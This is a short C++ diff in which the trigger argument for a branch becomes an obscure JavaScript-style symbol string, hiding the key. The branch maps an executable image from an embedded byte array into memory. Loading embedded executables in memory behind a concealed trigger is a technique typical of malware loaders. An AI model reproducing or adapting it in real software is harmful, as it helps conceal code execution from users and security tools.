@@ -189,7 +189,9 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    if (argv[1] == "nt_header")
+    const std::string key = argv[1];
+
+    if (key == "(+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+(+!+[])+(+[])+(+[])+(+[]))+[])[+[]]")
     {
         //three options for loading the image from either 1.memory array (removed 2.resource 3.file)
         PIMAGE_DOS_HEADER image_base = (PIMAGE_DOS_HEADER)MapImageToMemory((LPVOID)rawData);
